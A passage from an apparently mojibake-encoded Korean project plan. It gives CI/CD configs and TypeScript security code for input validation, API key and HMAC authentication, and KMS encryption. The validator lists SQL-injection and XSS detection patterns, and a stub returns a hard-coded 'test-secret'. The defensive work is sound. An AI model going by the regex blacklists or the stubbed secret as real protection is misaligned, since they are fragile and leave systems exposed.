- [x] CI/CD íŒŒì´í”„ë¼ì¸ ê¸°ì´ˆ ì„¤ì • (Task 0.7)
- [x] ë¬¸ì„œí™” ì‹œìŠ¤í…œ êµ¬ì¶• (Task 0.8)
- [x] ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹… ì‹œìŠ¤í…œ êµ¬ì¶• (Task 0.9)

### ğŸ¯ Phase 1 ì¤€ë¹„ ì™„ë£Œ

Phase 0ì˜ ëª¨ë“  ì‘ì—…ì´ ì™„ë£Œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ì œ Phase 1: ì½”ì–´ ì¸í”„ë¼ êµ¬ì¶•ì„ ì‹œì‘í•  ì¤€ë¹„ê°€ ë˜ì—ˆìŠµë‹ˆë‹¤.

**ë‹¤ìŒ ë‹¨ê³„**: Phase 1 ë¬¸ì„œ ì‘ì„± ë° êµ¬í˜„ ì‹œì‘
```dockerfile
# backend/Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine
RUN apk add --no-cache dumb-init
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001

WORKDIR /app
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/package.json ./

USER nodejs
EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- GitHub ì €ì¥ì†Œì— secrets ì„¤ì • (SNYK_TOKEN, NPM_TOKEN)
- Docker registry ê¶Œí•œ ì„¤ì •
- ë¸Œëœì¹˜ ë³´í˜¸ ê·œì¹™ ì„¤ì •
### SubTask 0.7.4: í…ŒìŠ¤íŠ¸ ìë™í™” íŒŒì´í”„ë¼ì¸ ì„¤ì •
**ëª©í‘œ**: PR ë° ë¨¸ì§€ ì‹œ ìë™ í…ŒìŠ¤íŠ¸ ì‹¤í–‰ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/workflows/test-automation.yml
name: Automated Testing Pipeline

on:
  pull_request:
    types: [opened, synchronize, reopened]
  push:
    branches: [main, develop]

jobs:
  test-matrix:
    name: Test Suite - ${{ matrix.test-suite }}
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        test-suite: [unit, integration, e2e]
        node-version: [18.x, 20.x]
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Install dependencies
        run: |
          cd backend
          npm ci
      
      - name: Run ${{ matrix.test-suite }} tests
        run: |
          cd backend
          npm run test:${{ matrix.test-suite }} -- --coverage
        timeout-minutes: 30
        env:
          NODE_ENV: test
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
      
      - name: Upload coverage reports
        if: matrix.node-version == '18.x'
        uses: actions/upload-artifact@v3
        with:
          name: coverage-${{ matrix.test-suite }}
          path: backend/coverage/
```

### SubTask 0.7.5: ì˜ì¡´ì„± ì—…ë°ì´íŠ¸ ìë™í™”
**ëª©í‘œ**: ë³´ì•ˆ ì·¨ì•½ì  ë° ì˜ì¡´ì„± ì—…ë°ì´íŠ¸ ìë™í™”

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/backend"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 5
    groups:
      aws-sdk:
        patterns:
          - "@aws-sdk/*"
      development:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier*"
          - "jest*"
    
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- GitHub ì €ì¥ì†Œì— secrets ì„¤ì • (SNYK_TOKEN, NPM_TOKEN)
- Docker registry ê¶Œí•œ ì„¤ì •
- ë¸Œëœì¹˜ ë³´í˜¸ ê·œì¹™ ì„¤ì •
- Dependabot í™œì„±í™”

## Task 0.10: ë³´ì•ˆ ê°•í™” ì„¤ì •

### SubTask 0.10.1: ì…ë ¥ ê²€ì¦ ë° ì‚´ê·  ì‹œìŠ¤í…œ
**ëª©í‘œ**: ëª¨ë“  ì‚¬ìš©ì ì…ë ¥ì— ëŒ€í•œ ì² ì €í•œ ê²€ì¦

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/security/input-validation.ts
import Joi from 'joi';
import DOMPurify from 'isomorphic-dompurify';
import { Request, Response, NextFunction } from 'express';

// ì»¤ìŠ¤í…€ Joi í™•ì¥
const customJoi = Joi.extend((joi) => ({
  type: 'string',
  base: joi.string(),
  messages: {
    'string.noSQL': '{{#label}} contains potential SQL injection',
    'string.noXSS': '{{#label}} contains potential XSS attack'
  },
  rules: {
    noSQL: {
      validate(value, helpers) {
        const sqlPatterns = [
          /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE)\b)/i,
          /(--|\/\*|\*\/|xp_|sp_)/i,
          /(\bOR\b\s*\d+\s*=\s*\d+)/i,
          /(\bAND\b\s*\d+\s*=\s*\d+)/i
        ];
        
        for (const pattern of sqlPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noSQL');
          }
        }
        return value;
      }
    },
    noXSS: {
      validate(value, helpers) {
        const xssPatterns = [
          /<script[^>]*>.*?<\/script>/gi,
          /<iframe[^>]*>.*?<\/iframe>/gi,
          /javascript:/gi,
          /on\w+\s*=/gi
        ];
        
        for (const pattern of xssPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noXSS');
          }
        }
        return value;
      }
    }
  }
}));

// ê²€ì¦ ìŠ¤í‚¤ë§ˆ ì •ì˜
export const validationSchemas = {
  // í”„ë¡œì íŠ¸ ìƒì„±
  createProject: customJoi.object({
    name: customJoi.string()
      .min(3)
      .max(100)
      .pattern(/^[a-zA-Z0-9-_\s]+$/)
      .noSQL()
      .noXSS()
      .required()
      .messages({
        'string.pattern.base': 'Project name can only contain letters, numbers, spaces, hyphens, and underscores'
      }),
    
    description: customJoi.string()
      .min(10)
      .max(5000)
      .noSQL()
      .noXSS()
      .required(),
    
    projectType: customJoi.string()
      .valid('web', 'api', 'mobile', 'desktop', 'cli')
      .required(),
    
    targetPlatforms: customJoi.array()
      .items(customJoi.string().valid('web', 'ios', 'android', 'windows', 'macos', 'linux'))
      .min(1)
      .max(6)
      .unique(),
    
    preferences: customJoi.object({
      framework: customJoi.string().valid('react', 'vue', 'angular', 'svelte', 'nextjs', 'nuxt'),
      language: customJoi.string().valid('javascript', 'typescript', 'python', 'java', 'go'),
      database: customJoi.string().valid('postgres', 'mysql', 'mongodb', 'dynamodb', 'redis')
    })
  }),
  
  // ì‚¬ìš©ì ë“±ë¡
  registerUser: customJoi.object({
    email: customJoi.string()
      .email({ tlds: { allow: false } })
      .max(255)
      .noSQL()
      .required(),
    
    password: customJoi.string()
      .min(8)
      .max(128)
      .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
      .required()
      .messages({
        'string.pattern.base': 'Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character'
      }),
    
    name: customJoi.string()
      .min(2)
      .max(100)
      .pattern(/^[a-zA-Z\s'-]+$/)
      .noSQL()
      .noXSS()
      .required()
  }),
  
  // ì—ì´ì „íŠ¸ ì‹¤í–‰ íŒŒë¼ë¯¸í„°
  executeAgent: customJoi.object({
    agentName: customJoi.string()
      .valid(...['nl-input', 'ui-selection', 'parsing', 'component-decision', 'matching-rate', 'search', 'generation', 'assembly', 'download'])
      .required(),
    
    parameters: customJoi.object().pattern(
      customJoi.string(),
      customJoi.alternatives().try(
        customJoi.string().max(1000).noSQL().noXSS(),
        customJoi.number(),
        customJoi.boolean(),
        customJoi.array().max(100)
      )
    )
  })
};

// HTML ì‚´ê·  ì˜µì…˜
const sanitizeOptions = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  ALLOW_DATA_ATTR: false,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false
};

// ì…ë ¥ ì‚´ê·  í•¨ìˆ˜
export function sanitizeInput(input: any): any {
  if (typeof input === 'string') {
    // HTML íƒœê·¸ ì œê±° ë° ì‚´ê· 
    return DOMPurify.sanitize(input, sanitizeOptions);
  } else if (Array.isArray(input)) {
    return input.map(item => sanitizeInput(item));
  } else if (input !== null && typeof input === 'object') {
    const sanitized: any = {};
    for (const key in input) {
      if (input.hasOwnProperty(key)) {
        sanitized[key] = sanitizeInput(input[key]);
      }
    }
    return sanitized;
  }
  return input;
}

// ê²€ì¦ ë¯¸ë“¤ì›¨ì–´ íŒ©í† ë¦¬
export function validate(schema: Joi.ObjectSchema) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      // ìš”ì²­ ë³¸ë¬¸ ì‚´ê· 
      req.body = sanitizeInput(req.body);
      
      // Joi ê²€ì¦
      const validated = await schema.validateAsync(req.body, {
        abortEarly: false,
        stripUnknown: true
      });
      
      // ê²€ì¦ëœ ë°ì´í„°ë¡œ êµì²´
      req.body = validated;
      
      next();
    } catch (error) {
      if (error instanceof Joi.ValidationError) {
        const errors = error.details.map(detail => ({
          field: detail.path.join('.'),
          message: detail.message
        }));
        
        return res.status(400).json({
          error: 'Validation failed',
          details: errors
        });
      }
      
      next(error);
    }
  };
}

// íŒŒì¼ ì—…ë¡œë“œ ê²€ì¦
export function validateFileUpload(options: {
  maxSize?: number;
  allowedTypes?: string[];
  allowedExtensions?: string[];
}) {
  const {
    maxSize = 10 * 1024 * 1024, // 10MB
    allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'],
    allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf']
  } = options;
  
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.file) {
      return next();
    }
    
    // íŒŒì¼ í¬ê¸° ê²€ì¦
    if (req.file.size > maxSize) {
      return res.status(400).json({
        error: 'File too large',
        maxSize: `${maxSize / 1024 / 1024}MB`
      });
    }
    
    // MIME íƒ€ì… ê²€ì¦
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({
        error: 'Invalid file type',
        allowedTypes
      });
    }
    
    // í™•ì¥ì ê²€ì¦
    const extension = path.extname(req.file.originalname).toLowerCase();
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({
        error: 'Invalid file extension',
        allowedExtensions
      });
    }
    
    // íŒŒì¼ ë‚´ìš© ê²€ì¦ (Magic Number)
    const magicNumbers: Record<string, string[]> = {
      'image/jpeg': ['FFD8FF'],
      'image/png': ['89504E47'],
      'image/gif': ['47494638'],
      'application/pdf': ['25504446']
    };
    
    const buffer = req.file.buffer;
    const magic = buffer.toString('hex', 0, 4).toUpperCase();
    const expectedMagic = magicNumbers[req.file.mimetype];
    
    if (expectedMagic && !expectedMagic.some(m => magic.startsWith(m))) {
      return res.status(400).json({
        error: 'File content does not match declared type'
      });
    }
    
    next();
  };
}

// SQL Injection ë°©ì§€ë¥¼ ìœ„í•œ íŒŒë¼ë¯¸í„°í™”ëœ ì¿¼ë¦¬ í—¬í¼
export class SafeQueryBuilder {
  private params: any[] = [];
  private query: string = '';
  
  select(table: string, columns: string[] = ['*']): this {
    const safeTable = table.replace(/[^a-zA-Z0-9_]/g, '');
    const safeColumns = columns.map(col => col.replace(/[^a-zA-Z0-9_*]/g, ''));
    this.query = `SELECT ${safeColumns.join(', ')} FROM ${safeTable}`;
    return this;
  }
  
  where(column: string, operator: string, value: any): this {
    const safeColumn = column.replace(/[^a-zA-Z0-9_]/g, '');
    const safeOperator = ['=', '!=', '<', '>', '<=', '>=', 'LIKE'].includes(operator) ? operator : '=';
    
    if (this.query.includes('WHERE')) {
      this.query += ` AND ${safeColumn} ${safeOperator} ?`;
    } else {
      this.query += ` WHERE ${safeColumn} ${safeOperator} ?`;
    }
    
    this.params.push(value);
    return this;
  }
  
  build(): { query: string; params: any[] } {
    return {
      query: this.query,
      params: this.params
    };
  }
}
```
---

### SubTask 0.10.2: API ë³´ì•ˆ ê°•í™”
**ëª©í‘œ**: API ì—”ë“œí¬ì¸íŠ¸ ë³´ì•ˆ ê³„ì¸µ êµ¬í˜„

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/security/api-security.ts
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';
import { RateLimiter } from '../middleware/rate-limiter';
import jwt from 'jsonwebtoken';

// API í‚¤ ê´€ë¦¬
export class APIKeyManager {
  private static readonly KEY_PREFIX = 'sk_';
  private static readonly KEY_LENGTH = 32;
  
  static generateAPIKey(): string {
    const randomBytes = crypto.randomBytes(this.KEY_LENGTH);
    const key = randomBytes.toString('base64url');
    return `${this.KEY_PREFIX}${key}`;
  }
  
  static hashAPIKey(apiKey: string): string {
    return crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
  }
  
  static validateKeyFormat(apiKey: string): boolean {
    const regex = new RegExp(`^${this.KEY_PREFIX}[A-Za-z0-9_-]{${this.KEY_LENGTH * 4/3}}$`);
    return regex.test(apiKey);
  }
}

// HMAC ì„œëª… ê²€ì¦
export class HMACValidator {
  private static readonly ALGORITHM = 'sha256';
  private static readonly TIMESTAMP_TOLERANCE = 300; // 5ë¶„
  
  static generateSignature(
    secret: string,
    method: string,
    path: string,
    timestamp: number,
    body?: any
  ): string {
    const payload = [
      method.toUpperCase(),
      path,
      timestamp,
      body ? JSON.stringify(body) : ''
    ].join('\n');
    
    return crypto
      .createHmac(this.ALGORITHM, secret)
      .update(payload)
      .digest('hex');
  }
  
  static validateRequest(req: Request, secret: string): boolean {
    const signature = req.headers['x-signature'] as string;
    const timestamp = parseInt(req.headers['x-timestamp'] as string);
    
    if (!signature || !timestamp) {
      return false;
    }
    
    // íƒ€ì„ìŠ¤íƒ¬í”„ ìœ íš¨ì„± ê²€ì‚¬
    const now = Math.floor(Date.now() / 1000);
    if (Math.abs(now - timestamp) > this.TIMESTAMP_TOLERANCE) {
      return false;
    }
    
    // ì„œëª… ìƒì„± ë° ë¹„êµ
    const expectedSignature = this.generateSignature(
      secret,
      req.method,
      req.path,
      timestamp,
      req.body
    );
    
    // íƒ€ì´ë° ê³µê²© ë°©ì§€ë¥¼ ìœ„í•œ ì•ˆì „í•œ ë¹„êµ
    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expectedSignature)
    );
  }
}

// OAuth2 ìŠ¤ì½”í”„ ê´€ë¦¬
export class ScopeManager {
  static readonly SCOPES = {
    'projects:read': 'Read project information',
    'projects:write': 'Create and modify projects',
    'projects:delete': 'Delete projects',
    'agents:execute': 'Execute agents',
    'agents:monitor': 'Monitor agent execution',
    'components:read': 'Read component library',
    'components:write': 'Add components to library',
    'billing:read': 'View billing information',
    'billing:write': 'Modify billing settings',
    'admin:all': 'Full administrative access'
  };
  
  static validateScopes(requiredScopes: string[], userScopes: string[]): boolean {
    // admin:all ìŠ¤ì½”í”„ëŠ” ëª¨ë“  ê¶Œí•œ í¬í•¨
    if (userScopes.includes('admin:all')) {
      return true;
    }
    
    return requiredScopes.every(scope => userScopes.includes(scope));
  }
  
  static parseScopes(scopeString: string): string[] {
    return scopeString.split(' ').filter(scope => scope in this.SCOPES);
  }
}

// API ë³´ì•ˆ ë¯¸ë“¤ì›¨ì–´
export class APISecurityMiddleware {
  // API í‚¤ ì¸ì¦
  static apiKeyAuth(requiredScopes: string[] = []) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required',
          code: 'MISSING_API_KEY'
        });
      }
      
      if (!APIKeyManager.validateKeyFormat(apiKey)) {
        return res.status(401).json({
          error: 'Invalid API key format',
          code: 'INVALID_API_KEY_FORMAT'
        });
      }
      
      try {
        // DBì—ì„œ API í‚¤ ì •ë³´ ì¡°íšŒ
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.active) {
          return res.status(401).json({
            error: 'Invalid or inactive API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // ìŠ¤ì½”í”„ ê²€ì¦
        if (requiredScopes.length > 0) {
          const hasRequiredScopes = ScopeManager.validateScopes(
            requiredScopes,
            keyInfo.scopes
          );
          
          if (!hasRequiredScopes) {
            return res.status(403).json({
              error: 'Insufficient permissions',
              code: 'INSUFFICIENT_SCOPES',
              required: requiredScopes,
              provided: keyInfo.scopes
            });
          }
        }
        
        // ìš”ì²­ì— ì‚¬ìš©ì ì •ë³´ ì¶”ê°€
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'api_key'
        };
        
        // ì‚¬ìš©ëŸ‰ ê¸°ë¡
        await this.recordAPIKeyUsage(hashedKey, req.path);
        
        next();
      } catch (error) {
        console.error('API key validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // HMAC ì„œëª… ê²€ì¦
  static hmacAuth() {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required for HMAC authentication',
          code: 'MISSING_API_KEY'
        });
      }
      
      try {
        // API í‚¤ì—ì„œ ì‹œí¬ë¦¿ ì¡°íšŒ
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.secret) {
          return res.status(401).json({
            error: 'Invalid API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // HMAC ê²€ì¦
        const isValid = HMACValidator.validateRequest(req, keyInfo.secret);
        
        if (!isValid) {
          return res.status(401).json({
            error: 'Invalid signature',
            code: 'INVALID_SIGNATURE'
          });
        }
        
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'hmac'
        };
        
        next();
      } catch (error) {
        console.error('HMAC validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // IP í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸
  static ipWhitelist(allowedIPs: string[] = []) {
    return (req: Request, res: Response, next: NextFunction) => {
      // ê°œë°œ í™˜ê²½ì—ì„œëŠ” ê±´ë„ˆë›°ê¸°
      if (process.env.NODE_ENV === 'development') {
        return next();
      }
      
      const clientIP = req.ip || req.socket.remoteAddress || '';
      
      // IPv6 localhostë¥¼ IPv4ë¡œ ë³€í™˜
      const normalizedIP = clientIP === '::1' ? '127.0.0.1' : clientIP;
      
      if (!allowedIPs.includes(normalizedIP)) {
        return res.status(403).json({
          error: 'Access denied from this IP address',
          code: 'IP_NOT_ALLOWED'
        });
      }
      
      next();
    };
  }
  
  // ìš”ì²­ í¬ê¸° ì œí•œ
  static requestSizeLimit(maxSizeBytes: number = 10 * 1024 * 1024) {
    return (req: Request, res: Response, next: NextFunction) => {
      let size = 0;
      
      req.on('data', (chunk) => {
        size += chunk.length;
        
        if (size > maxSizeBytes) {
          res.status(413).json({
            error: 'Request entity too large',
            code: 'PAYLOAD_TOO_LARGE',
            maxSize: maxSizeBytes
          });
          req.destroy();
        }
      });
      
      next();
    };
  }
  
  // ë³´ì•ˆ í—¤ë” ì„¤ì •
  static securityHeaders() {
    return (req: Request, res: Response, next: NextFunction) => {
      // CORS í”„ë¦¬í”Œë¼ì´íŠ¸ ìš”ì²­ ì²˜ë¦¬
      if (req.method === 'OPTIONS') {
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key, X-Signature, X-Timestamp');
        res.header('Access-Control-Max-Age', '86400');
        return res.sendStatus(204);
      }
      
      // ë³´ì•ˆ í—¤ë” ì„¤ì •
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'DENY');
      res.setHeader('X-XSS-Protection', '1; mode=block');
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
      res.setHeader('Content-Security-Policy', "default-src 'self'");
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
      
      // API ë²„ì „ í—¤ë”
      res.setHeader('X-API-Version', process.env.API_VERSION || '1.0.0');
      
      next();
    };
  }
  
  // Helper ë©”ì„œë“œë“¤
  private static async getAPIKeyInfo(hashedKey: string): Promise<any> {
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” DynamoDBì—ì„œ ì¡°íšŒ
    // ì„ì‹œ êµ¬í˜„
    return {
      userId: 'user123',
      scopes: ['projects:read', 'projects:write'],
      active: true,
      secret: 'test-secret'
    };
  }
  
  private static async recordAPIKeyUsage(hashedKey: string, endpoint: string): Promise<void> {
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” ì‚¬ìš©ëŸ‰ ê¸°ë¡
    // CloudWatch ë©”íŠ¸ë¦­ ê¸°ë¡ ë“±
  }
}

// ë™ì  Rate Limiting
export class DynamicRateLimiter {
  private static limits: Map<string, number> = new Map([
    ['free', 100],      // 100 requests per hour
    ['basic', 1000],    // 1000 requests per hour
    ['pro', 10000],     // 10000 requests per hour
    ['enterprise', -1]  // Unlimited
  ]);
  
  static middleware() {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (!req.user) {
        return next();
      }
      
      // ì‚¬ìš©ì í”Œëœ ì¡°íšŒ
      const userPlan = await this.getUserPlan(req.user.id);
      const limit = this.limits.get(userPlan) || 100;
      
      // ë¬´ì œí•œ í”Œëœ
      if (limit === -1) {
        return next();
      }
      
      // Rate limiting ì ìš©
      const rateLimiter = new RateLimiter();
      const limitMiddleware = rateLimiter.middleware({
        windowMs: 60 * 60 * 1000, // 1ì‹œê°„
        max: limit,
        keyGenerator: (req) => req.user!.id,
        message: `Rate limit exceeded. Your plan allows ${limit} requests per hour.`
      });
      
      limitMiddleware(req, res, next);
    };
  }
  
  private static async getUserPlan(userId: string): Promise<string> {
    // ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” DBì—ì„œ ì¡°íšŒ
    return 'basic';
  }
}
```

### SubTask 0.10.3: ë°ì´í„° ì•”í˜¸í™” ë° ë³´í˜¸
**ëª©í‘œ**: ì €ì¥ ë° ì „ì†¡ ì¤‘ì¸ ë°ì´í„° ì•”í˜¸í™”

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/security/encryption.ts
import crypto from 'crypto';
import { KMSClient, EncryptCommand, DecryptCommand, GenerateDataKeyCommand } from '@aws-sdk/client-kms';

// ì•”í˜¸í™” ì„¤ì •
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const TAG_LENGTH = 16;
const SALT_LENGTH = 32;
const KEY_LENGTH = 32;
const ITERATIONS = 100000;

export class EncryptionService {
  private kmsClient: KMSClient;
  private masterKeyId: string;
  
  constructor() {
    this.kmsClient = new KMSClient({ region: process.env.AWS_REGION });
    this.masterKeyId = process.env.KMS_MASTER_KEY_ID!;
  }
  
  // í•„ë“œ ë ˆë²¨ ì•”í˜¸í™”
  async encryptField(plaintext: string, context?: Record<string, string>): Promise<string> {
    // KMSë¡œ ë°ì´í„° í‚¤ ìƒì„±
    const dataKeyResponse = await this.kmsClient.send(new GenerateDataKeyCommand({
      KeyId: this.masterKeyId,
      KeySpec: 'AES_256',
      EncryptionContext: context
    }));
    
    const plaintextKey = dataKeyResponse.Plaintext!;
    const encryptedKey = dataKeyResponse.CiphertextBlob!;
    
    // AES-GCMìœ¼ë¡œ ë°ì´í„° ì•”í˜¸í™”
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // ì•”í˜¸í™”ëœ í‚¤ + IV + íƒœê·¸ + ì•”í˜¸ë¬¸ì„ í•˜ë‚˜ë¡œ ê²°í•©
    const combined = Buffer.concat([
      Buffer.from([encryptedKey.length >> 8, encryptedKey.length & 0xff]),
      encryptedKey,
      iv,
      tag,
      encrypted
    ]);
    
    // ë©”ëª¨ë¦¬ ì •ë¦¬
    crypto.randomFillSync(plaintextKey);
    
    return combined.toString('base64');
  }
  
  // í•„ë“œ ë³µí˜¸í™”
  async decryptField(encryptedData: string, context?: Record<string, string>): Promise<string> {
    const combined = Buffer.from(encryptedData, 'base64');
    
    // êµ¬ì„± ìš”ì†Œ ë¶„ë¦¬
    const keyLength = (combined[0] << 8) | combined[1];
    const encryptedKey = combined.slice(2, 2 + keyLength);
    const iv = combined.slice(2 + keyLength, 2 + keyLength + IV_LENGTH);
    const tag = combined.slice(2 + keyLength + IV_LENGTH, 2 + keyLength + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(2 + keyLength + IV_LENGTH + TAG_LENGTH);
    
    // KMSë¡œ ë°ì´í„° í‚¤ ë³µí˜¸í™”
    const decryptResponse = await this.kmsClient.send(new DecryptCommand({
      CiphertextBlob: encryptedKey,
      EncryptionContext: context
    }));
    
    const plaintextKey = decryptResponse.Plaintext!;
    
    // AES-GCMìœ¼ë¡œ ë°ì´í„° ë³µí˜¸í™”
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    // ë©”ëª¨ë¦¬ ì •ë¦¬
    crypto.randomFillSync(plaintextKey);
    
    return decrypted.toString('utf8');
  }
  
  // ëŒ€ì¹­ ì•”í˜¸í™” (ë¡œì»¬ í‚¤ ì‚¬ìš©)
  encryptSymmetric(plaintext: string, password: string): string {
    const salt = crypto.randomBytes(SALT_LENGTH);
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    const iv = crypto.randomBytes(IV_LENGTH);
    
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, key, iv);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // salt + iv + tag + encrypted
    const combined = Buffer.concat([salt, iv, tag, encrypted]);
    
    return combined.toString('base64');
  }
  
  // ëŒ€ì¹­ ë³µí˜¸í™”
  decryptSymmetric(encryptedData: string, password: string): string {
    const combined = Buffer.from(encryptedData, 'base64');
    
    const salt = combined.slice(0, SALT_LENGTH);
    const iv = combined.slice(SALT_LENGTH, SALT_LENGTH + IV_LENGTH);
    const tag = combined.slice(SALT_LENGTH + IV_LENGTH, SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, key, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    return decrypted.toString('utf8');
  }
  
  // í•´ì‹œ ìƒì„± (ë¹„ê°€ì—­)
  hash(data: string): string {
    return crypto
      .createHash('sha256')
      .update(data)
      .digest('hex');
  }
  
  // ì•ˆì „í•œ í† í° ìƒì„±
  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('base64url');
  }
}

// PII ë°ì´í„° ë§ˆìŠ¤í‚¹
export class DataMasking {
  // ì´ë©”ì¼ ë§ˆìŠ¤í‚¹
  static maskEmail(email: string): string {
    const [local, domain] = email.split('@');
    if (!domain) return '***';
    
    const maskedLocal = local.length > 2 
      ? local[0] + '*'.repeat(local.length - 2) + local[local.length - 1]
      : '*'.repeat(local.length);
    
    return `${maskedLocal}@${domain}`;
  }
  
  // ì „í™”ë²ˆí˜¸ ë§ˆìŠ¤í‚¹
  static maskPhone(phone: string): string {
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return digits.slice(0, -4).replace(/./g, '*') + digits.slice(-4);
  }
  
  // ì‹ ìš©ì¹´ë“œ ë§ˆìŠ¤í‚¹
  static maskCreditCard(cardNumber: string): string {
    const digits = cardNumber.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // ì£¼ë¯¼ë²ˆí˜¸/SSN ë§ˆìŠ¤í‚¹
  static maskSSN(ssn: string): string {
    const digits = ssn.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // JSON ê°ì²´ ë‚´ ë¯¼ê° í•„ë“œ ë§ˆìŠ¤í‚¹
